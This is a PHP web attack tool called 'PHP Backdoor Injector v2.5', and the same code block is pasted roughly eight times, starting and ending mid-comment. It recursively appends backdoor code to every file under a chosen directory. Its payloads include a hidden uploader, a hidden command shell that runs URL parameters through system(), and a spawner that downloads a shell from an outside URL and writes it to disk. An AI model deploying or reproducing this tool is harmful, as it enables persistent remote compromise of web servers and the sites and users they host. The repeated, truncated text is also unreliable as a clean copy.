    @Author : 74nc0x
    @Github : http://github.com/soracyberteam/
    @Date   : 22/Dec/2018
    Recode? jancuk kon.
*/
function inject($dir,$code){
$scan=scandir($dir);
$base=basename($_SERVER['PHP_SELF']);
foreach($scan as $file){if($file=='.' | $file=='..'){continue;}if($file==$base){continue;}if(is_dir("$dir/$file")){
$new="$dir/$file";
inject($new,$code);
}else{
echo "<body bgcolor='black'><font color='white'>";
$fh=fopen("$dir/$file",a);
if(fwrite($fh,"$code")){echo "[+] $dir/$file --> Success<br>";}else{echo "[-] $dir/$file --> Fail<br>";}
}
}
fclose($fh);
}
if(isset($_POST['inject'])){
$dir=$_POST['dir'];$code=$_POST['74nc0x'];
inject($dir,$code);
echo "<script>";
}
?>
<?php
if($_POST['payload']=="1"){
$ex='<?php
/* Usage : file.php?74nc0x */
if(isset($_GET[\'74nc0x\'])){
echo "gombrus@yahoo.com:~#<br><form action=\'\' enctype=\'multipart/form-data\' method=\'POST\'>
<input type=\'file\' name=\'filena\'> <input type=\'submit\' name=\'upload\' value=\'Upload\'><br>";
if(isset($_POST[\'upload\'])){
  $cwd=getcwd();
  $tmp=$_FILES[\'filena\'][\'tmp_name\'];
  $filena=$_FILES[\'filena\'][\'name\'];
  if(@copy($tmp, $filena)){
    echo "<br>Sukses -> $cwd/$filena";
  }else{
    echo "<br>Gagal -> Permission Denied";
  }
}
}
?>';
}elseif($_POST['payload']=="2"){
$ex='<?php
/* Usage : file.php?74nc0x=[command] */
if(isset($_GET[\'74nc0x\'])){
$x=$_GET[\'74nc0x\'];echo "<pre>";
system($x);
}
?>';
}elseif($_POST['payload']=="3"){
$ex='<?php
/* Shell -> 74nc0x.php */
$cok=\'https://www.mdf.or.id/idx.txt\'; // Link Shell
$fu=file_get_contents("$cok");
$fh=fopen(\'74nc0x.php\',w);
fwrite($fh,"$fu");
fclose($fh);
?>';
}elseif($_POST['payload']=="4"){
$ex='<?php
/* POST file = 74nc0x */
$cwd=getcwd();
$tmp=$_FILES[\'74nc0x\'][\'tmp_name\'];
$filena=$_FILES[\'74nc0x\'][\'name\'];
if(@copy($tmp, $filena)){
  echo "<br>Sukses -> $cwd/$filena";
}
?>';}
$x=htmlspecialchars("$ex");?><title>PHP Backdoor Injector v2.5</title>
<center><body bgcolor='grey'><pre>
<font color='white' size='4'>
<font color='red'>[</font> PHP Backdoor Injector v2.5 <font color='red'>]</font>
<form action='' method='POST'>
Code To Inject

<select name='payload'><option>Select Payload</option><option value='1'>Hidden Uploader</option><option value='2'>Hidden Command Shell</option><option value='3'>Auto Shell Spawner</option><option value='4'>Hidden Upload [CSRF]</option></select> <input type='submit' name='lockp' value='Lock'>

<textarea name='74nc0x' cols='50' rows='15'><?php echo $x;?></textarea>

Dir : <input type='text' name='dir' value='<?php $dir=getcwd();echo "$dir/";?>'>

<input type='submit' name='inject' value='Inject'></form>

Copyright (c) 2018 74NC0X - Sora Cyber Team<?php
/*
        PHP Backdoor Injector v.2.5
    @Author : 74nc0x
    @Github : http://github.com/soracyberteam/
    @Date   : 22/Dec/2018
    Recode? jancuk kon.
*/
function inject($dir,$code){
$scan=scandir($dir);
$base=basename($_SERVER['PHP_SELF']);
foreach($scan as $file){if($file=='.' | $file=='..'){continue;}if($file==$base){continue;}if(is_dir("$dir/$file")){
$new="$dir/$file";
inject($new,$code);
}else{
echo "<body bgcolor='black'><font color='white'>";
$fh=fopen("$dir/$file",a);
if(fwrite($fh,"$code")){echo "[+] $dir/$file --> Success<br>";}else{echo "[-] $dir/$file --> Fail<br>";}
}
}
fclose($fh);
}
if(isset($_POST['inject'])){
$dir=$_POST['dir'];$code=$_POST['74nc0x'];
inject($dir,$code);
echo "<script>";
}
?>
<?php
if($_POST['payload']=="1"){
$ex='<?php
/* Usage : file.php?74nc0x */
if(isset($_GET[\'74nc0x\'])){
echo "gombrus@yahoo.com:~#<br><form action=\'\' enctype=\'multipart/form-data\' method=\'POST\'>
<input type=\'file\' name=\'filena\'> <input type=\'submit\' name=\'upload\' value=\'Upload\'><br>";
if(isset($_POST[\'upload\'])){
  $cwd=getcwd();
  $tmp=$_FILES[\'filena\'][\'tmp_name\'];
  $filena=$_FILES[\'filena\'][\'name\'];
  if(@copy($tmp, $filena)){
    echo "<br>Sukses -> $cwd/$filena";
  }else{
    echo "<br>Gagal -> Permission Denied";
  }
}
}
?>';
}elseif($_POST['payload']=="2"){
$ex='<?php
/* Usage : file.php?74nc0x=[command] */
if(isset($_GET[\'74nc0x\'])){
$x=$_GET[\'74nc0x\'];echo "<pre>";
system($x);
}
?>';
}elseif($_POST['payload']=="3"){
$ex='<?php
/* Shell -> 74nc0x.php */
$cok=\'https://www.mdf.or.id/idx.txt\'; // Link Shell
$fu=file_get_contents("$cok");
$fh=fopen(\'74nc0x.php\',w);
fwrite($fh,"$fu");
fclose($fh);
?>';
}elseif($_POST['payload']=="4"){
$ex='<?php
/* POST file = 74nc0x */
$cwd=getcwd();
$tmp=$_FILES[\'74nc0x\'][\'tmp_name\'];
$filena=$_FILES[\'74nc0x\'][\'name\'];
if(@copy($tmp, $filena)){
  echo "<br>Sukses -> $cwd/$filena";
}
?>';}
$x=htmlspecialchars("$ex");?><title>PHP Backdoor Injector v2.5</title>
<center><body bgcolor='grey'><pre>
<font color='white' size='4'>
<font color='red'>[</font> PHP Backdoor Injector v2.5 <font color='red'>]</font>
<form action='' method='POST'>
Code To Inject

<select name='payload'><option>Select Payload</option><option value='1'>Hidden Uploader</option><option value='2'>Hidden Command Shell</option><option value='3'>Auto Shell Spawner</option><option value='4'>Hidden Upload [CSRF]</option></select> <input type='submit' name='lockp' value='Lock'>

<textarea name='74nc0x' cols='50' rows='15'><?php echo $x;?></textarea>

Dir : <input type='text' name='dir' value='<?php $dir=getcwd();echo "$dir/";?>'>

<input type='submit' name='inject' value='Inject'></form>

Copyright (c) 2018 74NC0X - Sora Cyber Team<?php
/*
        PHP Backdoor Injector v.2.5
    @Author : 74nc0x
    @Github : http://github.com/soracyberteam/
    @Date   : 22/Dec/2018
    Recode? jancuk kon.
*/
function inject($dir,$code){
$scan=scandir($dir);
$base=basename($_SERVER['PHP_SELF']);
foreach($scan as $file){if($file=='.' | $file=='..'){continue;}if($file==$base){continue;}if(is_dir("$dir/$file")){
$new="$dir/$file";
inject($new,$code);
}else{
echo "<body bgcolor='black'><font color='white'>";
$fh=fopen("$dir/$file",a);
if(fwrite($fh,"$code")){echo "[+] $dir/$file --> Success<br>";}else{echo "[-] $dir/$file --> Fail<br>";}
}
}
fclose($fh);
}
if(isset($_POST['inject'])){
$dir=$_POST['dir'];$code=$_POST['74nc0x'];
inject($dir,$code);
echo "<script>";
}
?>
<?php
if($_POST['payload']=="1"){
$ex='<?php
/* Usage : file.php?74nc0x */
if(isset($_GET[\'74nc0x\'])){
echo "gombrus@yahoo.com:~#<br><form action=\'\' enctype=\'multipart/form-data\' method=\'POST\'>
<input type=\'file\' name=\'filena\'> <input type=\'submit\' name=\'upload\' value=\'Upload\'><br>";
if(isset($_POST[\'upload\'])){
  $cwd=getcwd();
  $tmp=$_FILES[\'filena\'][\'tmp_name\'];
  $filena=$_FILES[\'filena\'][\'name\'];
  if(@copy($tmp, $filena)){
    echo "<br>Sukses -> $cwd/$filena";
  }else{
    echo "<br>Gagal -> Permission Denied";
  }
}
}
?>';
}elseif($_POST['payload']=="2"){
$ex='<?php
/* Usage : file.php?74nc0x=[command] */
if(isset($_GET[\'74nc0x\'])){
$x=$_GET[\'74nc0x\'];echo "<pre>";
system($x);
}
?>';
}elseif($_POST['payload']=="3"){
$ex='<?php
/* Shell -> 74nc0x.php */
$cok=\'https://www.mdf.or.id/idx.txt\'; // Link Shell
$fu=file_get_contents("$cok");
$fh=fopen(\'74nc0x.php\',w);
fwrite($fh,"$fu");
fclose($fh);
?>';
}elseif($_POST['payload']=="4"){
$ex='<?php
/* POST file = 74nc0x */
$cwd=getcwd();
$tmp=$_FILES[\'74nc0x\'][\'tmp_name\'];
$filena=$_FILES[\'74nc0x\'][\'name\'];
if(@copy($tmp, $filena)){
  echo "<br>Sukses -> $cwd/$filena";
}
?>';}
$x=htmlspecialchars("$ex");?><title>PHP Backdoor Injector v2.5</title>
<center><body bgcolor='grey'><pre>
<font color='white' size='4'>
<font color='red'>[</font> PHP Backdoor Injector v2.5 <font color='red'>]</font>
<form action='' method='POST'>
Code To Inject

<select name='payload'><option>Select Payload</option><option value='1'>Hidden Uploader</option><option value='2'>Hidden Command Shell</option><option value='3'>Auto Shell Spawner</option><option value='4'>Hidden Upload [CSRF]</option></select> <input type='submit' name='lockp' value='Lock'>

<textarea name='74nc0x' cols='50' rows='15'><?php echo $x;?></textarea>

Dir : <input type='text' name='dir' value='<?php $dir=getcwd();echo "$dir/";?>'>

<input type='submit' name='inject' value='Inject'></form>

Copyright (c) 2018 74NC0X - Sora Cyber Team<?php
/*
        PHP Backdoor Injector v.2.5
    @Author : 74nc0x
    @Github : http://github.com/soracyberteam/
    @Date   : 22/Dec/2018
    Recode? jancuk kon.
*/
function inject($dir,$code){
$scan=scandir($dir);
$base=basename($_SERVER['PHP_SELF']);
foreach($scan as $file){if($file=='.' | $file=='..'){continue;}if($file==$base){continue;}if(is_dir("$dir/$file")){
$new="$dir/$file";
inject($new,$code);
}else{
echo "<body bgcolor='black'><font color='white'>";
$fh=fopen("$dir/$file",a);
if(fwrite($fh,"$code")){echo "[+] $dir/$file --> Success<br>";}else{echo "[-] $dir/$file --> Fail<br>";}
}
}
fclose($fh);
}
if(isset($_POST['inject'])){
$dir=$_POST['dir'];$code=$_POST['74nc0x'];
inject($dir,$code);
echo "<script>";
}
?>
<?php
if($_POST['payload']=="1"){
$ex='<?php
/* Usage : file.php?74nc0x */
if(isset($_GET[\'74nc0x\'])){
echo "gombrus@yahoo.com:~#<br><form action=\'\' enctype=\'multipart/form-data\' method=\'POST\'>
<input type=\'file\' name=\'filena\'> <input type=\'submit\' name=\'upload\' value=\'Upload\'><br>";
if(isset($_POST[\'upload\'])){
  $cwd=getcwd();
  $tmp=$_FILES[\'filena\'][\'tmp_name\'];
  $filena=$_FILES[\'filena\'][\'name\'];
  if(@copy($tmp, $filena)){
    echo "<br>Sukses -> $cwd/$filena";
  }else{
    echo "<br>Gagal -> Permission Denied";
  }
}
}
?>';
}elseif($_POST['payload']=="2"){
$ex='<?php
/* Usage : file.php?74nc0x=[command] */
if(isset($_GET[\'74nc0x\'])){
$x=$_GET[\'74nc0x\'];echo "<pre>";
system($x);
}
?>';
}elseif($_POST['payload']=="3"){
$ex='<?php
/* Shell -> 74nc0x.php */
$cok=\'https://www.mdf.or.id/idx.txt\'; // Link Shell
$fu=file_get_contents("$cok");
$fh=fopen(\'74nc0x.php\',w);
fwrite($fh,"$fu");
fclose($fh);
?>';
}elseif($_POST['payload']=="4"){
$ex='<?php
/* POST file = 74nc0x */
$cwd=getcwd();
$tmp=$_FILES[\'74nc0x\'][\'tmp_name\'];
$filena=$_FILES[\'74nc0x\'][\'name\'];
if(@copy($tmp, $filena)){
  echo "<br>Sukses -> $cwd/$filena";
}
?>';}
$x=htmlspecialchars("$ex");?><title>PHP Backdoor Injector v2.5</title>
<center><body bgcolor='grey'><pre>
<font color='white' size='4'>
<font color='red'>[</font> PHP Backdoor Injector v2.5 <font color='red'>]</font>
<form action='' method='POST'>
Code To Inject

<select name='payload'><option>Select Payload</option><option value='1'>Hidden Uploader</option><option value='2'>Hidden Command Shell</option><option value='3'>Auto Shell Spawner</option><option value='4'>Hidden Upload [CSRF]</option></select> <input type='submit' name='lockp' value='Lock'>

<textarea name='74nc0x' cols='50' rows='15'><?php echo $x;?></textarea>

Dir : <input type='text' name='dir' value='<?php $dir=getcwd();echo "$dir/";?>'>

<input type='submit' name='inject' value='Inject'></form>

Copyright (c) 2018 74NC0X - Sora Cyber Team<?php
/*
        PHP Backdoor Injector v.2.5
    @Author : 74nc0x
    @Github : http://github.com/soracyberteam/
    @Date   : 22/Dec/2018
    Recode? jancuk kon.
*/
function inject($dir,$code){
$scan=scandir($dir);
$base=basename($_SERVER['PHP_SELF']);
foreach($scan as $file){if($file=='.' | $file=='..'){continue;}if($file==$base){continue;}if(is_dir("$dir/$file")){
$new="$dir/$file";
inject($new,$code);
}else{
echo "<body bgcolor='black'><font color='white'>";
$fh=fopen("$dir/$file",a);
if(fwrite($fh,"$code")){echo "[+] $dir/$file --> Success<br>";}else{echo "[-] $dir/$file --> Fail<br>";}
}
}
fclose($fh);
}
if(isset($_POST['inject'])){
$dir=$_POST['dir'];$code=$_POST['74nc0x'];
inject($dir,$code);
echo "<script>";
}
?>
<?php
if($_POST['payload']=="1"){
$ex='<?php
/* Usage : file.php?74nc0x */
if(isset($_GET[\'74nc0x\'])){
echo "gombrus@yahoo.com:~#<br><form action=\'\' enctype=\'multipart/form-data\' method=\'POST\'>
<input type=\'file\' name=\'filena\'> <input type=\'submit\' name=\'upload\' value=\'Upload\'><br>";
if(isset($_POST[\'upload\'])){
  $cwd=getcwd();
  $tmp=$_FILES[\'filena\'][\'tmp_name\'];
  $filena=$_FILES[\'filena\'][\'name\'];
  if(@copy($tmp, $filena)){
    echo "<br>Sukses -> $cwd/$filena";
  }else{
    echo "<br>Gagal -> Permission Denied";
  }
}
}
?>';
}elseif($_POST['payload']=="2"){
$ex='<?php
/* Usage : file.php?74nc0x=[command] */
if(isset($_GET[\'74nc0x\'])){
$x=$_GET[\'74nc0x\'];echo "<pre>";
system($x);
}
?>';
}elseif($_POST['payload']=="3"){
$ex='<?php
/* Shell -> 74nc0x.php */
$cok=\'https://www.mdf.or.id/idx.txt\'; // Link Shell
$fu=file_get_contents("$cok");
$fh=fopen(\'74nc0x.php\',w);
fwrite($fh,"$fu");
fclose($fh);
?>';
}elseif($_POST['payload']=="4"){
$ex='<?php
/* POST file = 74nc0x */
$cwd=getcwd();
$tmp=$_FILES[\'74nc0x\'][\'tmp_name\'];
$filena=$_FILES[\'74nc0x\'][\'name\'];
if(@copy($tmp, $filena)){
  echo "<br>Sukses -> $cwd/$filena";
}
?>';}
$x=htmlspecialchars("$ex");?><title>PHP Backdoor Injector v2.5</title>
<center><body bgcolor='grey'><pre>
<font color='white' size='4'>
<font color='red'>[</font> PHP Backdoor Injector v2.5 <font color='red'>]</font>
<form action='' method='POST'>
Code To Inject

<select name='payload'><option>Select Payload</option><option value='1'>Hidden Uploader</option><option value='2'>Hidden Command Shell</option><option value='3'>Auto Shell Spawner</option><option value='4'>Hidden Upload [CSRF]</option></select> <input type='submit' name='lockp' value='Lock'>

<textarea name='74nc0x' cols='50' rows='15'><?php echo $x;?></textarea>

Dir : <input type='text' name='dir' value='<?php $dir=getcwd();echo "$dir/";?>'>

<input type='submit' name='inject' value='Inject'></form>

Copyright (c) 2018 74NC0X - Sora Cyber Team<?php
/*
        PHP Backdoor Injector v.2.5
    @Author : 74nc0x
    @Github : http://github.com/soracyberteam/
    @Date   : 22/Dec/2018
    Recode? jancuk kon.
*/
function inject($dir,$code){
$scan=scandir($dir);
$base=basename($_SERVER['PHP_SELF']);
foreach($scan as $file){if($file=='.' | $file=='..'){continue;}if($file==$base){continue;}if(is_dir("$dir/$file")){
$new="$dir/$file";
inject($new,$code);
}else{
echo "<body bgcolor='black'><font color='white'>";
$fh=fopen("$dir/$file",a);
if(fwrite($fh,"$code")){echo "[+] $dir/$file --> Success<br>";}else{echo "[-] $dir/$file --> Fail<br>";}
}
}
fclose($fh);
}
if(isset($_POST['inject'])){
$dir=$_POST['dir'];$code=$_POST['74nc0x'];
inject($dir,$code);
echo "<script>";
}
?>
<?php
if($_POST['payload']=="1"){
$ex='<?php
/* Usage : file.php?74nc0x */
if(isset($_GET[\'74nc0x\'])){
echo "gombrus@yahoo.com:~#<br><form action=\'\' enctype=\'multipart/form-data\' method=\'POST\'>
<input type=\'file\' name=\'filena\'> <input type=\'submit\' name=\'upload\' value=\'Upload\'><br>";
if(isset($_POST[\'upload\'])){
  $cwd=getcwd();
  $tmp=$_FILES[\'filena\'][\'tmp_name\'];
  $filena=$_FILES[\'filena\'][\'name\'];
  if(@copy($tmp, $filena)){
    echo "<br>Sukses -> $cwd/$filena";
  }else{
    echo "<br>Gagal -> Permission Denied";
  }
}
}
?>';
}elseif($_POST['payload']=="2"){
$ex='<?php
/* Usage : file.php?74nc0x=[command] */
if(isset($_GET[\'74nc0x\'])){
$x=$_GET[\'74nc0x\'];echo "<pre>";
system($x);
}
?>';
}elseif($_POST['payload']=="3"){
$ex='<?php
/* Shell -> 74nc0x.php */
$cok=\'https://www.mdf.or.id/idx.txt\'; // Link Shell
$fu=file_get_contents("$cok");
$fh=fopen(\'74nc0x.php\',w);
fwrite($fh,"$fu");
fclose($fh);
?>';
}elseif($_POST['payload']=="4"){
$ex='<?php
/* POST file = 74nc0x */
$cwd=getcwd();
$tmp=$_FILES[\'74nc0x\'][\'tmp_name\'];
$filena=$_FILES[\'74nc0x\'][\'name\'];
if(@copy($tmp, $filena)){
  echo "<br>Sukses -> $cwd/$filena";
}
?>';}
$x=htmlspecialchars("$ex");?><title>PHP Backdoor Injector v2.5</title>
<center><body bgcolor='grey'><pre>
<font color='white' size='4'>
<font color='red'>[</font> PHP Backdoor Injector v2.5 <font color='red'>]</font>
<form action='' method='POST'>
Code To Inject

<select name='payload'><option>Select Payload</option><option value='1'>Hidden Uploader</option><option value='2'>Hidden Command Shell</option><option value='3'>Auto Shell Spawner</option><option value='4'>Hidden Upload [CSRF]</option></select> <input type='submit' name='lockp' value='Lock'>

<textarea name='74nc0x' cols='50' rows='15'><?php echo $x;?></textarea>

Dir : <input type='text' name='dir' value='<?php $dir=getcwd();echo "$dir/";?>'>

<input type='submit' name='inject' value='Inject'></form>

Copyright (c) 2018 74NC0X - Sora Cyber Team<?php
/*
        PHP Backdoor Injector v.2.5
    @Author : 74nc0x
    @Github : http://github.com/soracyberteam/
    @Date   : 22/Dec/2018
    Recode? jancuk kon.
*/
function inject($dir,$code){
$scan=scandir($dir);
$base=basename($_SERVER['PHP_SELF']);
foreach($scan as $file){if($file=='.' | $file=='..'){continue;}if($file==$base){continue;}if(is_dir("$dir/$file")){
$new="$dir/$file";
inject($new,$code);
}else{
echo "<body bgcolor='black'><font color='white'>";
$fh=fopen("$dir/$file",a);
if(fwrite($fh,"$code")){echo "[+] $dir/$file --> Success<br>";}else{echo "[-] $dir/$file --> Fail<br>";}
}
}
fclose($fh);
}
if(isset($_POST['inject'])){
$dir=$_POST['dir'];$code=$_POST['74nc0x'];
inject($dir,$code);
echo "<script>";
}
?>
<?php
if($_POST['payload']=="1"){
$ex='<?php
/* Usage : file.php?74nc0x */
if(isset($_GET[\'74nc0x\'])){
echo "gombrus@yahoo.com:~#<br><form action=\'\' enctype=\'multipart/form-data\' method=\'POST\'>
<input type=\'file\' name=\'filena\'> <input type=\'submit\' name=\'upload\' value=\'Upload\'><br>";
if(isset($_POST[\'upload\'])){
  $cwd=getcwd();
  $tmp=$_FILES[\'filena\'][\'tmp_name\'];
  $filena=$_FILES[\'filena\'][\'name\'];
  if(@copy($tmp, $filena)){
    echo "<br>Sukses -> $cwd/$filena";
  }else{
    echo "<br>Gagal -> Permission Denied";
  }
}
}
?>';
}elseif($_POST['payload']=="2"){
$ex='<?php
/* Usage : file.php?74nc0x=[command] */
if(isset($_GET[\'74nc0x\'])){
$x=$_GET[\'74nc0x\'];echo "<pre>";
system($x);
}
?>';
}elseif($_POST['payload']=="3"){
$ex='<?php
/* Shell -> 74nc0x.php */
$cok=\'https://www.mdf.or.id/idx.txt\'; // Link Shell
$fu=file_get_contents("$cok");
$fh=fopen(\'74nc0x.php\',w);
fwrite($fh,"$fu");
fclose($fh);
?>';
}elseif($_POST['payload']=="4"){
$ex='<?php
/* POST file = 74nc0x */
$cwd=getcwd();
$tmp=$_FILES[\'74nc0x\'][\'tmp_name\'];
$filena=$_FILES[\'74nc0x\'][\'name\'];
if(@copy($tmp, $filena)){
  echo "<br>Sukses -> $cwd/$filena";
}
?>';}
$x=htmlspecialchars("$ex");?><title>PHP Backdoor Injector v2.5</title>
<center><body bgcolor='grey'><pre>
<font color='white' size='4'>
<font color='red'>[</font> PHP Backdoor Injector v2.5 <font color='red'>]</font>
<form action='' method='POST'>
Code To Inject

<select name='payload'><option>Select Payload</option><option value='1'>Hidden Uploader</option><option value='2'>Hidden Command Shell</option><option value='3'>Auto Shell Spawner</option><option value='4'>Hidden Upload [CSRF]</option></select> <input type='submit' name='lockp' value='Lock'>

<textarea name='74nc0x' cols='50' rows='15'><?php echo $x;?></textarea>

Dir : <input type='text' name='dir' value='<?php $dir=getcwd();echo "$dir/";?>'>

<input type='submit' name='inject' value='Inject'></form>

Copyright (c) 2018 74NC0X - Sora Cyber Team<?php
/*
        PHP Backdoor Injector v.2.5
    @Author : 74nc0x
    @Github : http://github.com/soracyberteam/
    @Date   : 22/Dec/2018
    Recode? jancuk kon.
*/
function inject($dir,$code){
$scan=scandir($dir);
$base=basename($_SERVER['PHP_SELF']);
foreach($scan as $file){if($file=='.' | $file=='..'){continue;}if($file==$base){continue;}if(is_dir("$dir/$file")){
$new="$dir/$file";
inject($new,$code);
}else{
echo "<body bgcolor='black'><font color='white'>";
$fh=fopen("$dir/$file",a);
if(fwrite($fh,"$code")){echo "[+] $dir/$file --> Success<br>";}else{echo "[-] $dir/$file --> Fail<br>";}
}
}
fclose($fh);
}
if(isset($_POST['inject'])){
$dir=$_POST['dir'];$code=$_POST['74nc0x'];
inject($dir,$code);
echo "<script>";
}
?>
<?php
if($_POST['payload']=="1"){
$ex='<?php
/* Usage : file.php?74nc0x */
if(isset($_GET[\'74nc0x\'])){
echo "gombrus@yahoo.com:~#<br><form action=\'\' enctype=\'multipart/form-data\' method=\'POST\'>
<input type=\'file\' name=\'filena\'> <input type=\'submit\' name=\'upload\' value=\'Upload\'><br>";
if(isset($_POST[\'upload\'])){
  $cwd=getcwd();
  $tmp=$_FILES[\'filena\'][\'tmp_name\'];
  $filena=$_FILES[\'filena\'][\'name\'];
  if(@copy($tmp, $filena)){
    echo "<br>Sukses -> $cwd/$filena";
  }else{
    echo "<br>Gagal -> Permission Denied";
  }
}
}
?>';
}elseif($_POST['payload']=="2"){
$ex='<?php
/* Usage : file.php?74nc0x=[command] */
if(isset($_GET[\'74nc0x\'])){
$x=$_GET[\'74nc0x\'];echo "<pre>";
system($x);
}
?>';
}elseif($_POST['payload']=="3"){
$ex='<?php
/* Shell -> 74nc0x.php */
$cok=\'https://www.mdf.or.id/idx.txt\'; // Link Shell
$fu=file_get_contents("$cok");
$fh=fopen(\'74nc0x.php\',w);
fwrite($fh,"$fu");
fclose($fh);
?>';
}elseif($_POST['payload']=="4"){
$ex='<?php
/* POST file = 74nc0x */
$cwd=getcwd();
$tmp=$_FILES[\'74nc0x\'][\'tmp_name\'];
$filena=$_FILES[\'74nc0x\'][\'name\'];
if(@copy($tmp, $filena)){
  echo "<br>Sukses -> $cwd/$filena";
}
?>';}
$x=htmlspecialchars("$ex");?><title>PHP Backdoor Injector v2.5</title>
<center><body bgcolor='grey'><pre>
<font color='white' size='4'>
<font color='red'>[</font> PHP Backdoor Injector v2.5 <font color='red'>]</font>
<form action='' method='POST'>
Code To Inject

<select name='payload'><option>Select Payload</option><option value='1'>Hidden Uploader</option><option value='2'>Hidden Command Shell</option><option value='3'>Auto Shell Spawner</option><option value='4'>Hidden Upload [CSRF]</option></select> <input type='submit' name='lockp' value='Lock'>

<textarea name='74nc0x' cols='50' rows='15'><?php echo $x;?></textarea>

Dir : <input type='text' name='dir' value='<?php $dir=getcwd();echo "$dir/";?>'>

<input type='submit' name='inject' value='Inject'></form>

Copyright (c) 2018 74NC0X - Sora Cyber Team<?php
/*
        PHP Backdoor Injector v.2.5
    @Author : 74nc0x
    @Github : http://github.com/soracyberteam/
    @Date   : 22/Dec/2018
    Recode? jancuk kon.
*/
function inject($dir,$code){
$scan=scandir($dir);
$base=basename($_SERVER['PHP_SELF']);
foreach($scan as $file){if($file=='.' | $file=='..'){continue;}if($file==$base){continue;}if(is_dir("$dir/$file")){
$new="$dir/$file";
inject($new,$code);
}else{
echo "<body bgcolor='black'><font color='white'>";
$fh=fopen("$dir/$file",a);
if(fwrite($fh,"$code")){echo "[+] $dir/$file --> Success<br>";}else{echo "[-] $dir/$file --> Fail<br>";}
}
}
fclose($fh);
}
if(isset($_POST['inject'])){
$dir=$_POST['dir'];$code=$_POST['74nc0x'];
inject($dir,$code);
echo "<script>";
}
?>
<?php
if($_POST['payload']=="1"){
$ex='<?php
/* Usage : file.php?74nc0x */
if(isset($_GET[\'74nc0x\'])){
echo "gombrus@yahoo.com:~#<br><form action=\'\' enctype=\'multipart/form-data\' method=\'POST\'>
<input type=\'file\' name=\'filena\'> <input type=\'submit\' name=\'upload\' value=\'Upload\'><br>";
if(isset($_POST[\'upload\'])){
  $cwd=getcwd();
  $tmp=$_FILES[\'filena\'][\'tmp_name\'];
  $filena=$_FILES[\'filena\'][\'name\'];
  if(@copy($tmp, $filena)){
    echo "<br>Sukses -> $cwd/$filena";
  }else{
    echo "<br>Gagal -> Permission Denied";
  }
}
}
?>';
}elseif($_POST['payload']=="2"){
$ex='<?php
/* Usage : file.php?74nc0x=[command] */
if(isset($_GET[\'74nc0x\'])){
$x=$_GET[\'74nc0x\'];echo "<pre>";
system($x);
}
?>';
}elseif($_POST['payload']=="3"){
$ex='<?php
/* Shell -> 74nc0x.php */
$cok=\'https://www.mdf.or.id/idx.txt\'; // Link Shell
$fu=file_get_contents("$cok");
$fh=fopen(\'74nc0x.php\',w);
fwrite($fh,"$fu");
fclose($fh);
?>';
}elseif($_POST['payload']=="4"){
$ex='<?php
/* POST file = 74nc0x */
$cwd=getcwd();
$tmp=$_FILES[\'74nc0x\'][\'tmp_name\'];
$filena=$_FILES[\'74nc0x\'][\'name\'];
if(@copy($tmp, $filena)){
  echo "<br>Sukses -> $cwd/$filena";
}
?>';}
$x=htmlspecialchars("$ex");?><title>PHP Backdoor Injector v2.5</title>
<center><body bgcolor='grey'><pre>
<font color='white' size='4'>
<font color='red'>[</font> PHP Backdoor Injector v2.5 <font color='red'>]</font>
<form action='' method='POST'>
Code To Inject

<select name='payload'><option>Select Payload</option><option value='1'>Hidden Uploader</option><option value='2'>Hidden Command Shell</option><option value='3'>Auto Shell Spawner</option><option value='4'>Hidden Upload [CSRF]</option></select> <input type='submit' name='lockp' value='Lock'>

<textarea name='74nc0x' cols='50' rows='15'><?php echo $x;?></textarea>

Dir : <input type='text' name='dir' value='<?php $dir=getcwd();echo "$dir/";?>'>

<input type='submit' name='inject' value='Inject'></form>

Copyright (c) 2018 74NC0X - Sora Cyber Team<?php
/*
        PHP Backdoor Injector v.2.5
    @Author : 74nc0x
    @Github : http://github.com/soracyberteam/
    @Date   : 22/Dec/2018
    Recode? jancuk kon.
*/
function inject($dir,$code){
$scan=scandir($dir);
$base=basename($_SERVER['PHP_SELF']);
foreach($scan as $file){if($file=='.' | $file=='..'){continue;}if($file==$base){continue;}if(is_dir("$dir/$file")){
$new="$dir/$file";
inject($new,$code);
}else{
echo "<body bgcolor='black'><font color='white'>";
$fh=fopen("$dir/$file",a);
if(fwrite($fh,"$code")){echo "[+] $dir/$file --> Success<br>";}else{echo "[-] $dir/$file --> Fail<br>";}
}
}
fclose($fh);
}
if(isset($_POST['inject'])){
$dir=$_POST['dir'];$code=$_POST['74nc0x'];
inject($dir,$code);
echo "<script>";
}
?>
<?php
if($_POST['payload']=="1"){
$ex='<?php
/* Usage : file.php?74nc0x */
if(isset($_GET[\'74nc0x\'])){
echo "gombrus@yahoo.com:~#<br><form action=\'\' enctype=\'multipart/form-data\' method=\'POST\'>
<input type=\'file\' name=\'filena\'> <input type=\'submit\' name=\'upload\' value=\'Upload\'><br>";
if(isset($_POST[\'upload\'])){
  $cwd=getcwd();
  $tmp=$_FILES[\'filena\'][\'tmp_name\'];
  $filena=$_FILES[\'filena\'][\'name\'];
  if(@copy($tmp, $filena)){
    echo "<br>Sukses -> $cwd/$filena";
  }else{
    echo "<br>Gagal -> Permission Denied";
  }
}
}
?>';
}elseif($_POST['payload']=="2"){
$ex='<?php
/* Usage : file.php?74nc0x=[command] */
if(isset($_GET[\'74nc0x\'])){
$x=$_GET[\'74nc0x\'];echo "<pre>";
system($x);
}
?>';
}elseif($_POST['payload']=="3"){
$ex='<?php
/* Shell -> 74nc0x.php */
$cok=\'https://www.mdf.or.id/idx.txt\'; // Link Shell
$fu=file_get_contents("$cok");
$fh=fopen(\'74nc0x.php\',w);
fwrite($fh,"$fu");
fclose($fh);
?>';
}elseif($_POST['payload']=="4"){
$ex='<?php
/* POST file = 74nc0x */
$cwd=getcwd();
$tmp=$_FILES[\'74nc0x\'][\'tmp_name\'];
$filena=$_FILES[\'74nc0x\'][\'name\'];
if(@copy($tmp, $filena)){
  echo "<br>Sukses -> $cwd/$filena";
}
?>';}
$x=htmlspecialchars("$ex");?><title>PHP Backdoor Injector v2.5</title>
<center><body bgcolor='grey'><pre>
<font color='white' size='4'>
<font color='red'>[</font> PHP Backdoor Injector v2.5 <font color='red'>]</font>
<form action='' method='POST'>
Code To Inject

<select name='payload'><option>Select Payload</option><option value='1'>Hidden Uploader</option><option value='2'>Hidden Command Shell</option><option value='3'>Auto Shell Spawner</option><option value='4'>Hidden Upload [CSRF]</option></select> <input type='submit' name='lockp' value='Lock'>

<textarea name='74nc0x' cols='50' rows='15'><?php echo $x;?></textarea>

Dir : <input type='text' name='dir' value='<?php $dir=getcwd();echo "$dir/";?>'>

<input type='submit' name='inject' value='Inject'></form>

Copyright (c) 2018 74NC0X - Sora Cyber Team<?php
/*
        PHP Backdoor Injector v.2.5
    @Author : 74nc0x
